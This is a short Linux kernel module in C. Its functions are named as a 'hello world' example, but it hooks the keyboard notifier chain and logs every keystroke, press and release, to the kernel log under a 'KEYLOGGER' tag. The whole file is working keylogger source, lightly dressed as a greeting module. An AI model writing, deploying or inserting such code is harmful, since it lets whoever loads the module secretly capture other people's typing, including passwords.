#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/keyboard.h>	/* needec to Access Keyboard Events */

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;
  
  int ret = NOTIFY_OK;
  
  if (code == KBD_KEYCODE) {
    printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
  }
  return ret;  
}

static struct notifier_block nb = {
  .notifier_call = hello_notify
};

static int __init hello_start(void)
{
  printk(KERN_INFO "Loading hello module...\n");
  printk(KERN_INFO "Hello world\n");
  register_keyboard_notifier(&nb);
  return 0;
}
static void __exit hello_end(void)
{
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "Goodbye Mr.\n");
}
module_init(hello_start);
module_exit(hello_end);
MODULE_LICENSE("GPL");
